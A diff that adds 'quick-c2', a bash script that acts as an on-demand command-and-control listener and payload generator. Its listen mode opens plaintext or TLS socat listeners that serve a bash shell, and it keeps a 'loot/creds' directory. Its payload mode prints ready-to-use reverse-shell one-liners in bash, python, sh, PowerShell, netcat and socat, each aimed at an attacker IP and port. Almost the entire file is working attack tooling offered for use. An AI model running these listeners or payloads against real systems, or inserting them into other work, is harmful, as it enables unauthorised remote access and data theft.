@@ -1,0 +1,135 @@
+#!/bin/bash
+set -euo pipefail
+# /usr/local/bin/quick-c2
+# On-demand C2 listener using socat (encrypted with OpenSSL)
+# Usage: quick-c2 [mode] [options]
+# Modes: listen, payload, help
+
+LOOT="/opt/cardputer/loot/creds"
+
+generate_cert() {
+    CERTDir="/opt/cardputer/config/c2"
+    mkdir -p "$CERTDir"
+    if [ ! -f "$CERTDir/c2.pem" ]; then
+        echo "[*] Generating C2 TLS certificate..."
+        openssl req -x509 -newkey rsa:2048 -keyout "$CERTDir/c2.key" \
+            -out "$CERTDir/c2.pem" -days 365 -nodes \
+            -subj "/CN=zeroday/O=ZERODAY/C=DK" 2>/dev/null
+        cat "$CERTDir/c2.pem" "$CERTDir/c2.key" > "$CERTDir/c2.crt"
+        echo "[+] Certificate created: $CERTDir/c2.crt"
+    fi
+}
+
+case "${1:-help}" in
+    listen|shell|--listen|-l)
+        # Encrypted reverse shell listener
+        PORT="${2:-4444}"
+        ENCRYPT="${3:-yes}"
+        mkdir -p "$LOOT"
+
+        # Validate port
+        if ! echo "$PORT" | grep -qE '^[0-9]{1,5}$' || [ "$PORT" -lt 1 ] || [ "$PORT" -gt 65535 ]; then
+            echo "[!] Invalid port: $PORT (1-65535)"
+            exit 1
+        fi
+
+        if [ "$ENCRYPT" = "no" ]; then
+            echo "[*] Starting PLAINTEXT C2 listener on port $PORT"
+            echo "[*] Warning: Unencrypted — use only on trusted networks"
+            echo "[+] Connect from target:"
+            echo "    bash -i >& /dev/tcp/<YOUR_IP>/$PORT 0>&1"
+            socat TCP-LISTEN:"$PORT",reuseaddr,fork EXEC:"bash -il",pty,stderr,setsid,setpgid,close-on-stderr 2>/dev/null &
+            SOCAT_PID=$!
+            echo "[+] C2 listener PID: $SOCAT_PID"
+            echo "[+] Logging connections to $LOOT/c2_connections.log"
+            echo "[+] Press Ctrl+C to stop"
+            wait "$SOCAT_PID" 2>/dev/null
+        else
+            generate_cert
+            echo "[*] Starting ENCRYPTED C2 listener on port $PORT"
+            echo "[+] Connect from target (use payload command to generate)"
+            socat OPENSSL-LISTEN:"$PORT",cert=/opt/cardputer/config/c2/c2.crt,verify=0,reuseaddr,fork EXEC:"bash -il",pty,stderr,setsid,setpgid,close-on-stderr 2>/dev/null &
+            SOCAT_PID=$!
+            echo "[+] Encrypted C2 listener PID: $SOCAT_PID"
+            echo "[+] Press Ctrl+C to stop"
+            wait "$SOCAT_PID" 2>/dev/null
+        fi
+        ;;
+
+    bind|bindshell|--bind|-b)
+        # Listen for bind shell connection (target opens, you connect)
+        PORT="${2:-4444}"
+        echo "[*] Waiting for bind shell connection on port $PORT..."
+        echo "[+] On the TARGET, run: socat TCP-LISTEN:$PORT,reuseaddr EXEC:bash"
+        echo "[+] When ready, connect from here:"
+        echo "    socat STDIO TCP:<TARGET_IP>:$PORT"
+        ;;
+
+    payload|--payload|-p)
+        TYPE="${2:-bash}"
+        IP="${3:-<YOUR_IP>}"
+        PORT="${4:-4444}"
+
+        echo "[*] C2 Payload Generator"
+        echo ""
+        case "$TYPE" in
+            bash)
+                echo "# Bash reverse shell (unencrypted):"
+                echo "bash -i >& /dev/tcp/$IP/$PORT 0>&1"
+                echo ""
+                echo "# Bash reverse shell (encrypted):"
+                echo "socat OPENSSL:$IP:$PORT,verify=0 EXEC:'bash -il',pty,stderr,setsid,setpgid"
+                ;;
+            python|py)
+                echo "# Python reverse shell:"
+                echo "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"$IP\",$PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-il\"])'"
+                ;;
+            sh)
+                echo "# sh reverse shell (minimal):"
+                echo "/bin/sh -i >& /dev/tcp/$IP/$PORT 0>&1"
+                ;;
+            powershell|ps)
+                echo "# PowerShell reverse shell:"
+                echo "\$c=New-Object System.Net.Sockets.TcpClient('$IP',$PORT);\$s=\$c.GetStream();[byte[]]\$b=0..65535|%{0};while((\$i=\$s.Read(\$b,0,\$b.Length))-gt 0){\$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$b,0,\$i);\$r=(iex \$d 2>&1 | Out-String);\$r2=\$r+'PS '+\$(pwd).Path+'> ';\$sb=[System.Text.Encoding]::ASCII.GetBytes(\$r2);\$s.Write(\$sb,0,\$sb.Length)}"
+                ;;
+            netcat|nc)
+                echo "# Netcat reverse shell:"
+                echo "nc $IP $PORT -e /bin/bash"
+                echo ""
+                echo "# Netcat with -e disabled (use FIFO):"
+                echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $IP $PORT >/tmp/f"
+                ;;
+            socat)
+                echo "# Socat encrypted reverse shell (requires socat on target):"
+                echo "socat OPENSSL:$IP:$PORT,verify=0 EXEC:'bash -il',pty,stderr,setsid,setpgid"
+                ;;
+            *)
+                echo "[!] Unknown payload type: $TYPE"
+                echo "Available: bash, python, sh, powershell, netcat, socat"
+                exit 1
+                ;;
+        esac
+        ;;
+
+    help|--help|-h)
+        echo "Usage: quick-c2 <mode> [options]"
+        echo ""
+        echo "Modes:"
+        echo "  listen [port] [yes|no]     Start C2 listener (default: 4444, encrypted)"
+        echo "  bind [port]                Wait for bind shell connection"
+        echo "  payload <type> [ip] [port] Generate payload one-liners"
+        echo ""
+        echo "Payload types: bash, python, sh, powershell, netcat, socat"
+        echo ""
+        echo "Examples:"
+        echo "  quick-c2 listen                    # Encrypted C2 on port 4444"
+        echo "  quick-c2 listen 8443 no           # Plaintext C2 on 8443"
+        echo "  quick-c2 payload bash 10.0.0.1     # Generate bash payload"
+        echo "  quick-c2 payload python 10.0.0.1 4444"
+        ;;
+    *)
+        echo "[!] Unknown mode: $1"
+        echo "Run: quick-c2 help"
+        exit 1
+        ;;
+esac
